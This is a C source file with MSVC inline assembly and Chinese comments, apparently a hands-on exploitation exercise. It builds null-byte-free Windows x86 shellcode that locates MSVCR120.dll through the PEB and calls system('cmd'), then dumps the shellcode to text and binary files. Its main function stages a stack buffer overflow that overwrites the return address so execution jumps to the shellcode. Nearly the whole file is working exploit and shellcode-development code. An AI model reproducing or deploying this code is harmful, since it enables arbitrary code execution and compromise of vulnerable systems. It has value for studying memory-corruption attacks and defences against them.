#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "Header.h"

extern char *shellcode;
extern int shellcode_len;
extern char payload[];
extern int payload_len;

// 结构良好的shellcode, 用于功能性测试, 最终生成的shellcode需要在此基础上进行调整,
// 包括使用等价指令替换的方法消除代码中的0x00, 并尽可能缩减代码的长度.
__declspec(naked) void* get_shell()
{
	__asm
	{
		jmp CODE_ENTRY;
	LIBC_NAME:
		_EMIT 'M';
		_EMIT 0;
		_EMIT 'S';
		_EMIT 0;
		_EMIT 'V';
		_EMIT 0;
		_EMIT 'C';
		_EMIT 0;
		_EMIT 'R';
		_EMIT 0;
		_EMIT '1';
		_EMIT 0;
		_EMIT '2';
		_EMIT 0;
		_EMIT '0';
		_EMIT 0;
		_EMIT '.';
		_EMIT 0;
		_EMIT 'd';
		_EMIT 0;
		_EMIT 'l';
		_EMIT 0;
		_EMIT 'l';
		_EMIT 0;
		_EMIT 0;
		_EMIT 0;
	FUNC_NAME:
		_EMIT 's';
		_EMIT 'y';
		_EMIT 's';
		_EMIT 't';
		_EMIT 'e';
		_EMIT 'm';
		_EMIT 0;
	ARG_STR:
		_EMIT 'c';
		_EMIT 'm';
		_EMIT 'd';
		_EMIT 0;
/*********************************************************/
/*        bool _strcmpw(wchar *s1, wchar *s2)            */
/*********************************************************/
	_strcmpw:
		mov ebp, esp;
		push ebx;
		push esi;
		push edi;
		mov esi, [ebp + 4]; // s1
		mov edi, [ebp + 8]; // s2
	L1_STRCMPW:
		mov ax, [esi];
		mov bx, [edi];
		cmp ax, bx;
		jnz NOT_EQUAL_STRCMPW;
		cmp ax, 0;
		jnz L2_STRCMPW;
		cmp bx, 0;
		jnz L2_STRCMPW;
		mov eax, 1; // equal
		jmp END_STRCMPW;
	L2_STRCMPW:
		add esi, 2;
		add edi, 2;
		jmp L1_STRCMPW;
	NOT_EQUAL_STRCMPW:
		mov eax, 0; // not equal
	END_STRCMPW:
		pop edi;
		pop esi;
		pop ebx;
		ret;

/*********************************************************/
/*            void* _GetLibcBaseAddress()                */
/*********************************************************/
	_GetLibcBaseAddress:
		mov eax, fs : [0x30]; // linear address of PEB
		mov eax, [eax + 0xc]; // 从PEB结构体偏移0xc处取得PEB_LDR_DATA结构体的地址
		mov ebx, [eax + 0xc]; // ebx <- 第一个LDR_MODULE的地址
		mov edx, ebx;
	SEARCH_MODULE_LOOP:
		mov eax, ebx;
		add eax, 0x2C+0x4; // LDR_MODULE偏移0x2C处是BaseDllName, 一个UNICODE_STRING, 其中偏移0x4处是一个指向UNICODE字符串的指针
		mov eax, [eax];
		mov ecx, LIBC_NAME;
		push eax;
		push ecx;
		call _strcmpw;
		add esp, 8;
		cmp eax, 1; // eax==1 equal; eax==0 not equal
		jz MODULE_FOUND;
		mov ebx, [ebx];
		cmp ebx, edx;
		jz MODULE_NOT_FOUND;
		jmp SEARCH_MODULE_LOOP;
	MODULE_FOUND:
		mov eax, [ebx + 0x18]; // LDR_MODULE偏移0x18处是模块的线性基地址BaseAddress
		ret;
	MODULE_NOT_FOUND:
		mov eax, 0;
		ret;

/*********************************************************/
/*            void* _GetSystemFuncEntry()                */
/*********************************************************/
	_GetSystemFuncEntry:
		call _GetLibcBaseAddress;
		mov ebx, eax;
		mov eax, [eax + 0x35D0];
		add eax, ebx;
		ret;

/*********************************************************/
/*                    CODE_ENTRY                         */
/*********************************************************/
	CODE_ENTRY:
		call _GetSystemFuncEntry;
		mov ebx, ARG_STR;
		push ebx;
		call eax;
		add esp, 4;
		ret;
	}
}

// 生成实际可用的shellcode, 保存两份: 文本形式shellcode.txt, 二进制形式shellcode.bin
void dump_shellcode()
{
	char *codeStart,*codeEnd;
	int codeLen = 0;

	//_asm jmp __CODE_START__; // goto shellcode, for debugging

	_asm nop; // 调整, 使得编译出来的shellcode中不含0x00
	__asm
	{
		mov eax, __CODE_START__;
		mov codeStart, eax;
		mov eax, __CODE_END__;
		mov codeEnd, eax;
	}
	codeLen = codeEnd - codeStart;

	FILE *f1 = fopen("shellcode.txt", "w");
	FILE *f2 = fopen("shellcode.bin", "w");
	fprintf(f1, "codeLen: %d\n", codeLen);
	while (codeLen-- > 0) {
		fprintf(f1, "\\x%.2x", (unsigned char)*codeStart);
		fwrite((unsigned char*)codeStart, sizeof(char), 1, f2);
		codeStart++;
	}
	fclose(f1);
	fclose(f2);
	return;

__CODE_START__:
	__asm
	{
/*********************************************************/
/*                    CODE_ENTRY                         */
/*********************************************************/
	CODE_ENTRY:
/* 0 */	_EMIT 0xE8;
/* 1 */	_EMIT 0xFF;
/* 2 */	_EMIT 0xFF;
/* 3 */	_EMIT 0xFF;
/* 4 */	_EMIT 0xFF; // call 0xFFFFFFFF
	LABEL_BASE:
/* 5 */	_EMIT 0xC2;
/* 6 */	_EMIT 0x59;
/* 7 */	_EMIT 0x90;
// "call -1"后LABEL_BASE的地址被压栈, 然后eip指向标号4, 将标号4和5的"FFC2"译码成"inc edx";
// 然后执行标号6的"pop ecx"(59), 将保存在栈顶的LABEL_BASE的地址pop进ecx; 之后执行标号7的"nop"(90).
// 至此实现了自定位——LABEL_BASE的地址被保存在ecx
	_GetLibcBaseAddress:
		xor ebx, ebx;
		mov eax, fs:[ebx + 0x30]; // linear address of PEB (直接"mov eax,fs:[0x30]"会使代码中出现0x00)
		mov eax, [eax + 0xc]; // 从PEB结构体偏移0xc处取得PEB_LDR_DATA结构体的地址
		mov ebx, [eax + 0xc]; // ebx <- 第一个LDR_MODULE的地址
		mov edx, ebx; // edx保存循环链表的头地址
	SEARCH_MODULE_LOOP:
		mov eax, ebx;
		add eax, 0x2C + 0x4; // LDR_MODULE偏移0x2C处是BaseDllName, 一个UNICODE_STRING, 其中偏移0x4处是一个指向UNICODE字符串的指针
		mov esi, [eax];
		mov edi, LIBC_NAME;
		sub edi, LABEL_BASE; // 这两个label的地址中不能出现0x00, 如果有就重新编译知道满足要求
		add edi, ecx;
/*********************************************************/
/*        bool _strcmp(wchar *s1, char *s2)              */
/*        - args: esi = s1, edi = s2(end with '$')       */
/*        - ret: al=1 if equal, al=0 if NOT equal        */
/*********************************************************/
// 这里本可以写成"call _strcmp", 但是这样会在代码中出现0x00, 所以直接将函数嵌入进来
	_strcmp:
		push ebx;
	LOOP_CMP_STRCMP:
		mov al, [esi];
		mov bl, [edi];
		cmp al, bl;
		je CONTINUE_STRCMP;
		test al, al;
		jnz NOT_EQUAL_STRCMP;
		cmp bl, '$'; // 两个字符串同时结束时al=0,bl='$'
		jne NOT_EQUAL_STRCMP;
		xor al, al;
		inc al; // equal (这两条指令用于替代"mov al,1")
		jmp END_STRCMP;
	CONTINUE_STRCMP:
		inc esi;
		inc esi; // 两个"inc esi"一共2字节,一个"add esi,2"却需要3字节
		inc edi;
		jmp LOOP_CMP_STRCMP;
	NOT_EQUAL_STRCMP:
		xor al, al; // not equal
	END_STRCMP:
		pop ebx;
/******************** end of _strcmp ********************/
		cmp al, 1; // al==1 equal; al==0 not equal
		je MODULE_FOUND;
		mov ebx, [ebx];
		cmp ebx, edx;
		je MODULE_NOT_FOUND; // 循环链表已经遍历完了
		jmp SEARCH_MODULE_LOOP;
	MODULE_FOUND:
		mov eax, [ebx + 0x18]; // LDR_MODULE偏移0x18处是模块的线性基地址BaseAddress
	_GetSystemFuncEntry:
		mov ebx, eax;
		sub ebx, 0xfff9dec7;
		sub eax, 0xfff7f73e; // 用sub替换add, 使得代码中没有0x00. 加上一个数 <=> 减去这个数的相反数
		//add ebx, 0x62139; // 0x62139是msvcr120.dll中字符串"cmd"的RVA
		//add eax, 0x808c2; // 0x808c2是msvcr120.dll的export address table中记录的system函数的入口RVA
		push ebx;
		call eax; // 获得shell之后就结束了, 不必关注调用结束后的事情
	MODULE_NOT_FOUND:
		jmp MODULE_NOT_FOUND; // endless loop
/*********************************************************/
/*                      Data                             */
/*********************************************************/
	LIBC_NAME:
		_EMIT 'M';
		_EMIT 'S';
		_EMIT 'V';
		_EMIT 'C';
		_EMIT 'R';
		_EMIT '1';
		_EMIT '2';
		_EMIT '0';
		_EMIT '.';
		_EMIT 'd';
		_EMIT 'l';
		_EMIT 'l';
		_EMIT '$'; // '$'作为结束符, 因为shellcode中不能出现0x00
	}
__CODE_END__:
	return;
}

int main()
{
#if 0
	dump_shellcode();
#else
	char buf[128];
	memset(buf, 0xaa, sizeof(buf)); // mark buf, for debugging
	printf("&buf = %.8x\n", (int)buf);

	// 模拟buf溢出
	memcpy(payload, shellcode, shellcode_len);
	memset(payload + shellcode_len, 'A', 128 - shellcode_len + 4); // padding
	*(int*)(payload + 128 + 4) = (int)buf; // 把返回地址覆盖成buf的首地址, 即shellcode的入口
	memcpy(buf, payload, payload_len); // overflow
#endif
}